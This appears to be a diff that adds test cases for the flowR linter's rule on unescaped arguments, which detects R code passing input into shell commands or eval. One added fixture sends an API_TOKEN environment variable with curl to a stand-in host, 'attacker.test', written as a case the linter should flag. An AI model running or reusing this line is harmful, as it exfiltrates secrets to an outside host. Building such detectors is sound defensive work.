@@ -1,10 +1,11 @@
 import { describe } from 'vitest';
 import { withTreeSitter } from '../_helper/shell';
-import { assertLinter } from '../_helper/linter';
+import { assertLinter, assertLintedLines } from '../_helper/linter';
 import { LintingResultCertainty } from '../../../src/linter/linter-format';
 import { SourceRange } from '../../../src/util/range';
 import { InputTraceType, InputType } from '../../../src/queries/catalog/input-sources-query/simple-input-classifier';
 import { UnescapedArgumentCategory } from '../../../src/linter/rules/unescaped-arguments';
+import { decorateLabelContext, label } from '../_helper/label';
 
 /** A shiny server function template with `input` from the user */
 function shinyServer(body: string): string {
@@ -28,6 +29,25 @@ describe('flowR linter', withTreeSitter(parser => {
 				description: 'Escape the value with `shQuote`',
 				replacement: 'shQuote(x)'
 			}]
+		}]);
+		assertLinter('processx passes its arguments without a shell', parser, 'f <- function(d) processx::run("ls", d)', 'unescaped-arguments', []);
+		assertLinter('system2 hands its arguments to a shell', parser, 'f <- function(d) system2("ls", d)', 'unescaped-arguments', [{
+			certainty: LintingResultCertainty.Uncertain,
+			category:  UnescapedArgumentCategory.System,
+			function:  'system2',
+			loc:       SourceRange.from(1, 32, 1, 32),
+			sources:   [{ id: 6, trace: InputTraceType.Pure, types: [InputType.Parameter] }],
+			input:     [InputType.Parameter],
+			quickFix:  [{ type: 'replace', loc: SourceRange.from(1, 32, 1, 32), description: 'Escape the value with `shQuote`', replacement: 'shQuote(d)' }]
+		}]);
+		assertLinter('do.call with a constant function name', parser, 't <- lapply(1:3, function(i) data.frame(a = i))\ndo.call("rbind", t)', 'unescaped-arguments', []);
+		assertLinter('do.call with a function name from a parameter', parser, 'f <- function(fn) do.call(fn, list(1))', 'unescaped-arguments', [{
+			certainty: LintingResultCertainty.Uncertain,
+			category:  UnescapedArgumentCategory.Eval,
+			function:  'do.call',
+			loc:       SourceRange.from(1, 27, 1, 28),
+			sources:   [{ id: 4, trace: InputTraceType.Unknown, types: [InputType.Parameter] }],
+			input:     [InputType.Parameter]
 		}]);
 		assertLinter('pasted parameter', parser, 'f <- function(dir) system(paste0("ls ", dir))', 'unescaped-arguments', [{
 			certainty: LintingResultCertainty.Uncertain,
@@ -105,6 +125,17 @@ describe('flowR linter', withTreeSitter(parser => {
 
 	describe('Unescaped Evaluation', () => {
 		assertLinter('constant evaluation', parser, 'eval(parse(text = "1+1"))', 'unescaped-arguments', []);
+		/* the code is the one the program spells out, a language object is no input by itself */
+		assertLinter('constant code built from a quoted expression', parser, 'code <- deparse(quote(1 + 2))\ncode <- gsub("2", "3", code)\neval(parse(text = code))', 'unescaped-arguments', []);
+		assertLinter('constant quoted expression', parser, 'eval(quote(1 + 2))', 'unescaped-arguments', []);
+		assertLinter('a captured argument is code of the caller', parser, 'f <- function(x) { e <- substitute(x); eval(e) }\nf(y)', 'unescaped-arguments', [{
+			certainty: LintingResultCertainty.Certain,
+			category:  UnescapedArgumentCategory.Eval,
+			function:  'eval',
+			loc:       SourceRange.from(1, 45, 1, 45),
+			sources:   [{ id: 12, types: [InputType.Lang], trace: InputTraceType.Alias }],
+			input:     [InputType.Lang]
+		}]);
 		assertLinter('bounded evaluation', parser, 'eval(parse(text = match.arg(x, c("a", "b"))))', 'unescaped-arguments', []);
 		assertLinter('constant symbol lookup', parser, 'get("x")', 'unescaped-arguments', []);
 		assertLinter('constant symbol lookup of a known variable', parser, 'x <- 2\nget("x")', 'unescaped-arguments', []);
@@ -213,4 +244,5 @@ describe('flowR linter', withTreeSitter(parser => {
 			input:     [InputType.Unknown]
 		}]);
 	});
+	assertLintedLines(decorateLabelContext(label('security: unescaped into the command', ['name-normal', 'function-calls']), ['dataflow']), parser, 'secret <- Sys.getenv("API_TOKEN")\nsystem(paste("curl -d", secret, "attacker.test"))', 'unescaped-arguments', [2]);
 }));
